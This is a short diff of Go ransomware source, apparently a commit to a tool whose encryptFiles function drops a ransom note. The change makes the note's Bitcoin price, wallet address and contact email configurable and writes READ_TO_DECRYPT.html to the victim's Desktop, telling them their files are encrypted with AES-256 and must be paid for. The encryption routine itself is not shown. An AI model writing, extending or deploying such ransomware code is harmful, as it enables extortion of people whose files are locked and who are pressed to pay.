@@ -192,20 +192,21 @@ func encryptFiles() {
 
 	message := `
 	<pre>
-	YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG
-	AES-256 ALGORITHM.
+	YOUR FILES HAVE BEEN ENCRYPTED USING A
+	STRONG AES-256 ALGORITHM.
 
-	YOUR IDENTIFICATION IS %s
+	YOUR IDENTIFICATION IS
+	%s
 
-	PLEASE SEND %s TO THE FOLLOWING WALLET
+	SEND %s TO THE FOLLOWING WALLET
+	%s
 
-		    %s
-
-	TO RECOVER THE KEY NECESSARY TO DECRYPT YOUR
-	FILES
+	AND AFTER PAY CONTACT %s
+	SENDING YOUR IDENTIFICATION TO RECOVER
+	THE KEY NECESSARY TO DECRYPT YOUR FILES
 	</pre>
 	`
-	content := []byte(fmt.Sprintf(message, keys["id"], "0.345 BTC", "XWpXtxrJpSsRx5dICGjUOwkrhIypJKVr"))
+	content := []byte(fmt.Sprintf(message, keys["id"], cmd.Price, cmd.Wallet, cmd.ContactEmail))
 
 	// Write the READ_TO_DECRYPT on Desktop
 	ioutil.WriteFile(cmd.BaseDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)
